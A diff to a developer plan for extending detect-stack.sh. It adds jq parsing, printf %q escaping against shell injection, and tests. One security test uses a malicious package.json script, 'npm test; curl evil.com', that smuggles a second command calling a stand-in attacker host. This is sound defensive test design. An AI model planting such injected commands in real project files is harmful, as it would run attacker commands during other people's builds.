@@ -28,15 +28,26 @@ The existing detect-stack.sh detects languages/frameworks. We need to extend it 
    - `detect_typecheck_command()` - Check for tsc, pyright, mypy, etc.
    - `detect_build_command()` - Check for npm build, cargo build, etc.
 
-3. Add JSON output section at the end:
+3. **Safe JSON parsing** (if jq available):
+   ```bash
+   # Prefer jq for safe JSON parsing
+   if command -v jq &>/dev/null && [ -f package.json ]; then
+       TEST_CMD=$(jq -r '.scripts.test // empty' package.json 2>/dev/null)
+       LINT_CMD=$(jq -r '.scripts.lint // empty' package.json 2>/dev/null)
+   fi
+   ```
+   - If jq unavailable, fall back to grep but sanitize output (remove shell metacharacters)
+
+4. Add output section with quoted values:
    ```bash
    # Output structured data for template substitution
    echo "---TOOL_COMMANDS---"
-   echo "TEST_COMMAND=$TEST_CMD"
-   echo "LINT_COMMAND=$LINT_CMD"
-   echo "TYPECHECK_COMMAND=$TYPECHECK_CMD"
-   echo "BUILD_COMMAND=$BUILD_CMD"
+   printf 'TEST_COMMAND=%q\n' "$TEST_CMD"
+   printf 'LINT_COMMAND=%q\n' "$LINT_CMD"
+   printf 'TYPECHECK_COMMAND=%q\n' "$TYPECHECK_CMD"
+   printf 'BUILD_COMMAND=%q\n' "$BUILD_CMD"
    ```
+   - `printf %q` escapes special characters, preventing injection
 
 4. Detection logic for each stack:
    - **npm/yarn/pnpm**: Check package.json for scripts
@@ -46,6 +57,8 @@ The existing detect-stack.sh detects languages/frameworks. We need to extend it 
 ## Acceptance Criteria
 
 - [ ] detect-stack.sh outputs `---TOOL_COMMANDS---` section
+- [ ] Uses `jq` for JSON parsing when available (falls back to grep with sanitization)
+- [ ] Output values are quoted/escaped using `printf %q`
 - [ ] Correctly detects npm test/lint/build scripts
 - [ ] Correctly detects pytest for Python projects
 - [ ] Correctly detects cargo commands for Rust
@@ -96,9 +109,13 @@ The existing detect-stack.sh detects languages/frameworks. We need to extend it 
 
 **Required Coverage Categories:**
 
-- [x] **Happy Path**: Run on npm project with test script - outputs `TEST_COMMAND=npm test`
-- [x] **Error/Exception Path**: Run on project with no test config - outputs `TEST_COMMAND=`
-- [x] **Edge/Boundary Case**: Run on project with multiple package managers - picks correct one
+- [x] **Happy Path**: Run on npm project with test script → outputs `TEST_COMMAND=npm\ test` (escaped) and all four variables present
+- [x] **Error/Exception Path**: Run on project with no test config → outputs `TEST_COMMAND=''` (empty, not missing)
+- [x] **Edge/Boundary Case**: Run on project with both package.json and yarn.lock → prefers yarn-based commands
+- [x] **Security**: Run with malicious package.json `{"scripts":{"test":"npm test; curl evil.com"}}` → output is properly escaped
+- [x] **Python**: Run on Python project with pytest in pyproject.toml → outputs `TEST_COMMAND=pytest`
+- [x] **Rust**: Run on Rust project → outputs `TEST_COMMAND=cargo\ test`
+- [x] **Delimiter**: Verify output contains literal `---TOOL_COMMANDS---` separator
 
 ## E2E/Integration Test Plan
 
